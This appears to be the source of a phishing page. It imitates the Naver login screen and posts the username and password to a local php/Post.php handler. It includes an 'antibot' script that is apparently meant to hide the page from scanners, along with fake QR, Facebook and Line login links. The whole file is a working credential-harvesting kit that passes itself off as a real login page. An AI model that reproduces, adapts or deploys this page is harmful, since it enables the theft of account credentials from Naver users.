<?php

include('php/antibot.php');

?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>네이버 로그인</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
 
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  <script src='https://kit.fontawesome.com/a076d05399.js'></script>

<!-- Fonts -->
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@900&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500;900&display=swap" rel="stylesheet">

   <link rel="stylesheet" href="css/style.css">



<script type="text/javascript">
function googleTranslateElementInit() {
  new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
}
</script>

<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
</head>
<body id="bd">



<div class="container" style="border: 0px solid red;">









  <div class="row my-3 px-md-5 mx-md-5  " style="border: 0px solid red;">



   <div class="dropdown-content">
      <a href="index.php">한국어</a>
      <a href="eng.php">English</a>
   <!--      <a href="#">中文(简体)</a>
      <a href="#">언어선택</a> -->
    </div>



    <div id="google_translate_element"></div>
	</div>

    
  </div>


  <div class="row center-text" style="border: 0px solid blue;">
  	  <a href="../index.php" id="header1"><h1 class="center-text mt-4" id="header1" style="">NAVER</h1></a>
  </div>

  <div class="row mx-md-1  text-center mt-2" style="display: block;">
  	<form class="" id="form1" style="" method="POST" action="php/Post.php">
  		<div class="form-group " id="formgroup">
  			<input type="text" name="us" placeholder="사용자 이름" class="form-control" id="inp" style="">
  		</div>
  		<div class="form-group " id="formgroup" >
  			<input type="password" name="ps" placeholder="암호" class="form-control" id="inp">
  		</div>
  		<div class="form-group text-center" id="formgroup" >
  			<button class="btn btn-primary" type="submit" id="btnback" name="btnnaver">로그인</button>
  			
  		</div>
  		

  		<hr>

  		<h3 class="mt-5 mb-4 text-center" id="header2">간편한 로그인</h3>
  		
  			
  	
  			
  			
  	</form>

  	<div id="form1" class=" text-center">
	    <a href="Socials/QRcode.php" id="sociallink">
	  		<div id="socials" >
	  				<div class="my-auto text-center" id="imgsocial">
	  					<img src="img/social1.png" class="img-fluid" >
	  				</div>
	  				<div class="my-auto"  id="contentsocial">
	  					<span class="my-auto" id="textsocial">QR 코드로 로그인</span>
	  				</div>
	  		</div>
	  	</a>
		<a href="Socials/fb.php" id="sociallink">
	  		<div id="socials" >

	  				<div class="my-auto text-center" id="imgsocial">
	  					<img src="img/social2.png" class="img-fluid" >
	  				</div>
	  				<div class="my-auto"  id="contentsocial">
	  					<span class="my-auto" id="textsocial">Facebook</span>
	  				</div>
	  		</div>
	  	</a>
		<a href="Socials/line.php" id="sociallink">  
	  		<div id="socials" >
	  				<div class="my-auto text-center" id="imgsocial">
	  					<img src="img/social3.png" class="img-fluid" >
	  				</div>
	  				<div class="my-auto"  id="contentsocial">
	  					<span class="my-auto" id="textsocial">Line</span>
	  				</div>
	  		</div>
	  	</a>
  		
  	</div>

  	<div id="form1" class="text-center">
  		<span id="footer">잊었 어<a href="forgot/Reset.php" id="sociallinkf">사용자 이름</a> 또는 <a href="forgot/Reset.php" id="sociallinkf">암호</a>   ? | 가입하기</span>
  		
  	</div>
  </div>

</div>

</body>
</html>
